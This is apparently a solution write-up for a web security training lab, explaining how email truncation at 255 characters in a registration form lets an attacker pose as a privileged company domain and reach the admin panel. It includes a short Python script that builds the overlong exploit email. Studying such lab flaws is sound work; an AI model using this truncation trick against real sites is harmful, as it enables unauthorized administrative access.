@@ -1,0 +1,42 @@
+Lab: Inconsistent handling of exceptional input
+
+Vulnerability: This lab doesn't adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality.
+
+Goal: To solve the lab, access the admin panel and delete the user carlos.
+
+Analysis:
+1. Register an account with email attacker@exploit-0a4b006904a3142983146ddc017c0068.exploit-server.net
+=> Can not access /admin : Admin interface only available if logged in as a DontWannaCry user
+
+2. In the Email client, see that: Displaying all emails @exploit-0a4b006904a3142983146ddc017c0068.exploit-server.net and all subdomains
+
+3. In the field Email of Register form, see that if the email input does not check the length of email input. 
+=> Try entering email with more than 500 characters and see that when log in, it only displays 255 characters
+=> Maybe maximum length of email is 255 characters
+=> So try to exploit it
+
+Solution:
+1. Using generate_email to create an email which can exploit this vulnerability: 
+import random
+import string
+
+def generate_email(total_length=255, subdomain="@dontwannacry.com", domain=""):
+    if total_length <= len(subdomain):
+        raise ValueError("total_length must be greater than the length of subdomain")
+
+    random_characters = string.ascii_letters + string.digits
+    prefix_length = total_length - len(subdomain)
+    prefix = ''.join(random.choices(random_characters, k=prefix_length))
+
+    return prefix + subdomain + '.' + domain
+
+if __name__ == "__main__":
+    user_input = input("Enter email domain: ")
+    email = generate_email(domain=user_input)
+    print(email)
+    
+
+2. Register an account with this email and log in
+
+3. Access /admin page and delete carlos account 
+=> SUCCESSFULY
